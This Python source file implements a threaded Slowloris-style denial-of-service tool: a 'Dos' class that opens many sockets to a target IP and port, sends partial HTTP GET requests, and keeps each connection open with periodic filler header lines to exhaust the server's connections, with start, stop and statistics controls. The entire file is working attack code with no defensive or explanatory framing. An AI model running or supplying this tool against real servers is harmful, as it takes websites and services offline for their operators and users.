from __future__ import annotations
import random
import socket
import threading
import time
from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class DosStats:
    alive_sockets: int = 0
    opened: int = 0
    closed: int = 0
    threads_active: int = 0
    started_at: Optional[float] = None
    running: bool = False


class Dos:

    def __init__(
        self,
        target_ip: str,
        target_port: int = 80,
        threads: int = 10,
        sockets_per_thread: int = 50,
        keepalive_interval: float = 15.0,
        connect_timeout: float = 5.0,
    ) -> None:
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = max(1, threads)
        self.sockets_per_thread = max(1, sockets_per_thread)
        self.keepalive_interval = max(0.1, keepalive_interval)
        self.connect_timeout = connect_timeout

        self._sockets: List[socket.socket] = []
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._workers: List[threading.Thread] = []
        self._stats = DosStats()


    def _open_one(self) -> Optional[socket.socket]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.connect_timeout)
            s.connect((self.target_ip, self.target_port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.target_ip}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-Language: en-US,en\r\n")
            return s
        except Exception:
            return None

    def _open_pool(self) -> int:
        opened = 0
        for _ in range(self.sockets_per_thread):
            if self._stop.is_set():
                break
            s = self._open_one()
            if s is not None:
                with self._lock:
                    self._sockets.append(s)
                opened += 1
        return opened


    def _worker(self) -> None:
        self._open_pool()
        with self._lock:
            self._stats.threads_active += 1

        while not self._stop.is_set():
            dead: List[socket.socket] = []
            with self._lock:
                current = list(self._sockets)

            for s in current:
                try:
                    s.send(b"X-Keepalive: " + b"a" * 128 + b"\r\n")
                except Exception:
                    dead.append(s)

            if dead:
                with self._lock:
                    for s in dead:
                        if s in self._sockets:
                            self._sockets.remove(s)
                        try:
                            s.close()
                        except Exception:
                            pass
                    self._stats.closed += len(dead)
                self._open_pool()

            with self._lock:
                self._stats.alive_sockets = len(self._sockets)

            self._stop.wait(self.keepalive_interval)

        with self._lock:
            self._stats.threads_active -= 1


    def run(self) -> None:
        self._stop.clear()
        self._stats.started_at = time.time()
        self._stats.running = True
        self._stats.opened = 0
        self._stats.closed = 0
        self._stats.alive_sockets = 0
        self._stats.threads_active = 0

        self._workers = []
        for i in range(self.threads):
            t = threading.Thread(target=self._worker, name=f"dos-{i:02d}", daemon=True)
            t.start()
            self._workers.append(t)
            time.sleep(0.05) 

        self._stats.opened = self.threads * self.sockets_per_thread

    def stop(self) -> None:
        self._stop.set()
        with self._lock:
            for s in self._sockets:
                try:
                    s.close()
                except Exception:
                    pass
            self._sockets.clear()
        self._stats.running = False
        self._stats.alive_sockets = 0

    def stats(self) -> dict:
        with self._lock:
            return {
                "alive_sockets": self._stats.alive_sockets,
                "opened": self._stats.opened,
                "closed": self._stats.closed,
                "threads_active": self._stats.threads_active,
                "started_at": self._stats.started_at,
                "running": self._stats.running,
                "target": f"{self.target_ip}:{self.target_port}",
            }
        